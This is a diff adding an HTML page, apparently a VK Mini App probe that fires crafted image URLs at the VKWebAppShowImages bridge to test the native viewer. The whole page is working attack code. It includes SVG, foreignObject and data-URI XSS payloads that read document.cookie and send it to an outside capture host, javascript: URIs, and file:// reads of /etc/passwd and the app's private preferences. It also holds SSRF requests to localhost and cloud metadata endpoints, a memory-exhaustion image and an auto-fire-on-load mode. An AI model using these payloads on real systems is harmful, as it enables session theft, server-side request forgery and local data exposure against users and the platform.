@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Image Test</title>
+<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" defer></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f4f5;color:#000;min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:14px;padding:20px;max-width:520px;margin:0 auto 14px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+h2{font-size:17px;font-weight:600;text-align:center;margin-bottom:4px}
+.sub{font-size:11px;color:#818c99;text-align:center;margin-bottom:14px;line-height:1.5}
+.pill{display:inline-block;font-size:10px;padding:2px 8px;border-radius:8px;font-weight:600;margin-left:6px;vertical-align:middle}
+.p-ok{background:#e3f8e9;color:#2eb851}.p-fail{background:#ffe4e4;color:#e64646}.p-wait{background:#eee;color:#818c99}.p-crit{background:#ff5252;color:#fff}.p-run{background:#e6f2ff;color:#0077ff}
+.row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f7f7f7}
+.rname{font-size:12px;color:#000;font-weight:500}
+.rdesc{font-size:10px;color:#818c99;margin-top:2px;line-height:1.4}
+btn{border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:600;cursor:pointer;background:#0077ff;color:#fff;margin:4px}
+#log{background:#0d1117;border-radius:8px;padding:10px;font-family:ui-monospace,monospace;font-size:10px;color:#aaa;max-height:400px;overflow-y:auto;margin-top:12px}
+#log p{margin:2px 0;line-height:1.4}
+.l-ok{color:#4caf50}.l-warn{color:#ffa726}.l-err{color:#ef5350}.l-crit{color:#ff5252;font-weight:700}.l-info{color:#64b5f6}
+.section{font-size:13px;font-weight:600;color:#0077ff;margin:14px 0 6px;padding-top:10px;border-top:1px solid #f0f0f0}
+.btn-row{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
+.btn-row button{border:none;border-radius:8px;padding:8px 14px;font-size:11px;font-weight:600;cursor:pointer;background:#0077ff;color:#fff}
+.btn-row button.alt{background:#e64646}
+.btn-row button.sec{background:#4a76a8}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h2>VKWebAppShowImages — Attack Surface Probe</h2>
+  <p class="sub">Tests what the native image viewer accepts: SVG+JS for XSS, protocol schemes,
+    SSRF endpoints, data URIs. Each vector fires <code>VKWebAppShowImages</code> with a crafted URL.</p>
+
+  <!-- Vector 1: SVG with embedded JavaScript -->
+  <div class="section">1. SVG + JavaScript → XSS in vk.ru origin</div>
+  <div class="row"><div>
+    <div class="rname">SVG from attacker server <span class="pill p-wait" id="s-svg-remote">WAIT</span></div>
+    <div class="rdesc">Remote .svg with &lt;script&gt; — if rendered inline, JS executes on vk.ru</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">data:image/svg+xml <span class="pill p-wait" id="s-svg-data">WAIT</span></div>
+    <div class="rdesc">SVG via data URI with onload handler + fetch to capture server</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">SVG with foreignObject <span class="pill p-wait" id="s-svg-foreign">WAIT</span></div>
+    <div class="rdesc">SVG foreignObject embeds HTML+JS — deeper rendering test</div>
+  </div></div>
+
+  <!-- Vector 2: Protocol schemes -->
+  <div class="section">2. Protocol Scheme Abuse</div>
+  <div class="row"><div>
+    <div class="rname">file:// <span class="pill p-wait" id="s-file">WAIT</span></div>
+    <div class="rdesc">file:///etc/passwd or file:///sdcard/ — local filesystem read</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">javascript: <span class="pill p-wait" id="s-js">WAIT</span></div>
+    <div class="rdesc">javascript:alert(document.domain) — classic XSS vector</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">data:text/html <span class="pill p-wait" id="s-datahtml">WAIT</span></div>
+    <div class="rdesc">data:text/html with script — HTML rendering in viewer</div>
+  </div></div>
+
+  <!-- Vector 3: SSRF -->
+  <div class="section">3. SSRF — Internal Endpoints</div>
+  <div class="row"><div>
+    <div class="rname">127.0.0.1 <span class="pill p-wait" id="s-localhost">WAIT</span></div>
+    <div class="rdesc">http://127.0.0.1/ — hit local services if VK fetches server-side</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">Cloud metadata <span class="pill p-wait" id="s-meta">WAIT</span></div>
+    <div class="rdesc">http://169.254.169.254/latest/meta-data/ — AWS/GCP metadata</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">Callback to capture server <span class="pill p-wait" id="s-callback">WAIT</span></div>
+    <div class="rdesc">Image URL → attacker server — logs request headers (IP, UA, referrer)</div>
+  </div></div>
+
+  <!-- Vector 4: Image parser abuse -->
+  <div class="section">4. Parser / Rendering Tests</div>
+  <div class="row"><div>
+    <div class="rname">Oversized image <span class="pill p-wait" id="s-big">WAIT</span></div>
+    <div class="rdesc">Huge dimension image — memory exhaustion / crash</div>
+  </div></div>
+  <div class="row"><div>
+    <div class="rname">Polyglot JPEG/HTML <span class="pill p-wait" id="s-polyglot">WAIT</span></div>
+    <div class="rdesc">Content-type confusion — file served as image but contains HTML</div>
+  </div></div>
+
+  <div class="btn-row">
+    <button onclick="runAll()">Run ALL vectors sequentially</button>
+    <button class="alt" onclick="runAutoLaunch()">Auto-launch (fires on load)</button>
+  </div>
+
+  <div class="section">Manual single-fire</div>
+  <div class="btn-row">
+    <button class="sec" onclick="fire('svg-remote')">SVG remote</button>
+    <button class="sec" onclick="fire('svg-data')">SVG data:</button>
+    <button class="sec" onclick="fire('svg-foreign')">SVG foreign</button>
+    <button class="sec" onclick="fire('file')">file://</button>
+    <button class="sec" onclick="fire('js')">javascript:</button>
+    <button class="sec" onclick="fire('datahtml')">data:html</button>
+    <button class="sec" onclick="fire('localhost')">127.0.0.1</button>
+    <button class="sec" onclick="fire('meta')">metadata</button>
+    <button class="sec" onclick="fire('callback')">callback</button>
+    <button class="sec" onclick="fire('big')">oversized</button>
+    <button class="sec" onclick="fire('polyglot')">polyglot</button>
+  </div>
+
+  <div id="log"></div>
+</div>
+
+<script>
+const q = new URLSearchParams(location.search);
+const SRV = q.get('srv') || '';
+const APP_ID = q.get('vk_app_id') || '(unknown)';
+const AUTO = q.get('auto') === '1';
+
+function ts(){ return new Date().toTimeString().slice(0,8); }
+function lg(msg, cls){
+  const d = document.getElementById('log');
+  const p = document.createElement('p');
+  if(cls) p.className = 'l-' + cls;
+  p.textContent = '[' + ts() + '] ' + msg;
+  d.appendChild(p); d.scrollTop = d.scrollHeight;
+}
+function pill(id, txt, cls){
+  const e = document.getElementById('s-' + id);
+  if(e){ e.textContent = txt; e.className = 'pill ' + cls; }
+}
+async function post(type, data){
+  if(!SRV) return;
+  try{
+    await fetch(SRV + '/log?type=' + encodeURIComponent(type), {
+      method: 'POST',
+      headers: {'Content-Type':'application/json', 'ngrok-skip-browser-warning':'true'},
+      body: JSON.stringify({...data, app_id: APP_ID, _ts: Date.now(), ua: navigator.userAgent})
+    });
+  }catch(e){}
+}
+
+// SVG payloads
+const SVG_XSS = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">
+  <rect width="400" height="300" fill="#1a1a2e"/>
+  <text x="50%" y="40%" fill="#e94560" font-size="24" text-anchor="middle">XSS Probe</text>
+  <text x="50%" y="60%" fill="#fff" font-size="14" text-anchor="middle" id="d"></text>
+  <script>
+    document.getElementById('d').textContent = document.domain + ' / ' + document.cookie.slice(0,50);
+    new Image().src = '${SRV || "https://etho0.github.io"}/log?type=SVG_XSS_EXEC&amp;domain=' + encodeURIComponent(document.domain) + '&amp;cookie=' + encodeURIComponent(document.cookie.slice(0,200));
+  </script>
+</svg>`;
+
+const SVG_FOREIGN = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">
+  <foreignObject width="400" height="300">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <h1 style="color:red;font-family:sans-serif">foreignObject rendered</h1>
+      <p id="info" style="color:#fff;font-family:monospace;font-size:12px"></p>
+      <script>
+        document.getElementById('info').textContent = 'domain: ' + document.domain + ' cookie: ' + document.cookie.slice(0,50);
+        fetch('${SRV || "https://etho0.github.io"}/log?type=SVG_FOREIGN_EXEC', {
+          method: 'POST', headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({domain: document.domain, cookie: document.cookie.slice(0,200),
+            href: location.href, origin: location.origin})
+        });
+      </script>
+    </body>
+  </foreignObject>
+</svg>`;
+
+const SVG_DATA = 'data:image/svg+xml,' + encodeURIComponent(SVG_XSS);
+const SVG_FOREIGN_DATA = 'data:image/svg+xml,' + encodeURIComponent(SVG_FOREIGN);
+const DATA_HTML = 'data:text/html,<script>new Image().src="' + (SRV || 'https://etho0.github.io') +
+  '/log?type=DATA_HTML_EXEC&domain="+document.domain+"&cookie="+document.cookie.slice(0,200)</script>';
+
+// Build vector map
+function getVectors(){
+  const callbackUrl = SRV ? (SRV + '/log?type=IMAGE_CALLBACK') : 'https://etho0.github.io/vk_image_probe.html';
+  return {
+    'svg-remote': {
+      label: 'SVG remote (attacker server)',
+      images: [callbackUrl.replace('/log?type=IMAGE_CALLBACK', '/xss.svg')],
+      desc: 'Remote SVG file with <script> tag'
+    },
+    'svg-data': {
+      label: 'SVG data URI with JS',
+      images: [SVG_DATA],
+      desc: 'data:image/svg+xml with embedded script'
+    },
+    'svg-foreign': {
+      label: 'SVG foreignObject + JS',
+      images: [SVG_FOREIGN_DATA],
+      desc: 'SVG foreignObject embedding HTML+script'
+    },
+    'file': {
+      label: 'file:// protocol',
+      images: ['file:///etc/passwd', 'file:///sdcard/DCIM/Camera/', 'file:///data/data/com.vkontakte.android/shared_prefs/'],
+      desc: 'Local filesystem access attempt'
+    },
+    'js': {
+      label: 'javascript: protocol',
+      images: ['javascript:void(new Image().src="' + (SRV||'https://etho0.github.io') + '/log?type=JS_PROTO_EXEC&d="+document.domain)'],
+      desc: 'javascript: URI execution'
+    },
+    'datahtml': {
+      label: 'data:text/html',
+      images: [DATA_HTML],
+      desc: 'HTML rendering via data URI'
+    },
+    'localhost': {
+      label: 'SSRF 127.0.0.1',
+      images: ['http://127.0.0.1/', 'http://127.0.0.1:8080/', 'http://localhost/'],
+      desc: 'Hit local services via image fetch'
+    },
+    'meta': {
+      label: 'Cloud metadata SSRF',
+      images: [
+        'http://169.254.169.254/latest/meta-data/',
+        'http://169.254.169.254/computeMetadata/v1/',
+        'http://100.100.100.200/latest/meta-data/'
+      ],
+      desc: 'AWS/GCP/Alibaba metadata endpoint'
+    },
+    'callback': {
+      label: 'Callback to capture server',
+      images: [callbackUrl + '&probe=showimages&ts=' + Date.now()],
+      desc: 'Logs request headers from VK image fetch'
+    },
+    'big': {
+      label: 'Oversized SVG',
+      images: ['data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="99999" height="99999"><rect width="99999" height="99999" fill="red"/></svg>')],
+      desc: 'Memory exhaustion via huge canvas'
+    },
+    'polyglot': {
+      label: 'HTML served as image URL',
+      images: [callbackUrl.replace('/log?type=IMAGE_CALLBACK', '/polyglot?type=IMAGE_POLYGLOT')],
+      desc: 'Content-type confusion: HTML body at image URL'
+    }
+  };
+}
+
+async function fireVector(key){
+  const vectors = getVectors();
+  const v = vectors[key];
+  if(!v){ lg('Unknown vector: ' + key, 'err'); return; }
+
+  pill(key, 'FIRING', 'p-run');
+  lg(`[${key}] ${v.label} — ${v.desc}`, 'warn');
+  post('SHOW_IMAGES_VECTOR', {vector: key, label: v.label, images: v.images.map(u => u.slice(0,200))});
+
+  const t0 = Date.now();
+  try{
+    const r = await vkBridge.send('VKWebAppShowImages', {images: v.images, start_index: 0});
+    const ms = Date.now() - t0;
+    lg(`[${key}] OK in ${ms}ms — viewer opened. result: ${JSON.stringify(r)}`, 'crit');
+    post('SHOW_IMAGES_HIT', {vector: key, elapsed_ms: ms, result: r});
+    pill(key, `HIT ${ms}ms`, 'p-crit');
+    return true;
+  }catch(e){
+    const ms = Date.now() - t0;
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,300) : String(e);
+    lg(`[${key}] BLOCKED in ${ms}ms — ${err}`, 'err');
+    post('SHOW_IMAGES_FAIL', {vector: key, elapsed_ms: ms, error: err});
+    pill(key, 'blocked', 'p-fail');
+    return false;
+  }
+}
+
+function fire(key){ fireVector(key); }
+
+async function runAll(){
+  lg('=== Running ALL vectors sequentially ===', 'warn');
+  const keys = Object.keys(getVectors());
+  for(const k of keys){
+    await fireVector(k);
+    await new Promise(r => setTimeout(r, 1500));
+  }
+  lg('=== ALL vectors complete ===', 'warn');
+}
+
+async function runAutoLaunch(){
+  lg('=== AUTO-LAUNCH: firing SVG+JS vectors (highest value) ===', 'warn');
+  await fireVector('svg-data');
+  await new Promise(r => setTimeout(r, 1000));
+  await fireVector('svg-foreign');
+  await new Promise(r => setTimeout(r, 1000));
+  await fireVector('callback');
+}
+
+async function boot(){
+  for(let i = 0; i < 30 && !window.vkBridge; i++){
+    await new Promise(r => setTimeout(r, 150));
+  }
+  if(!window.vkBridge){
+    lg('vkBridge not loaded — not in Mini App context', 'err');
+    return;
+  }
+  try{
+    await vkBridge.send('VKWebAppInit');
+    lg('VKWebAppInit OK — app_id=' + APP_ID, 'ok');
+  }catch(e){
+    lg('VKWebAppInit failed: ' + JSON.stringify(e).slice(0,200), 'err');
+  }
+
+  if(AUTO){
+    lg('auto=1 detected — firing auto-launch vectors', 'warn');
+    await runAutoLaunch();
+  } else {
+    lg('Ready. Click buttons to fire individual vectors, or "Run ALL".', 'info');
+    lg('Add ?auto=1 to URL to auto-fire on launch.', 'info');
+  }
+}
+
+boot();
+</script>
+</body>
+</html>
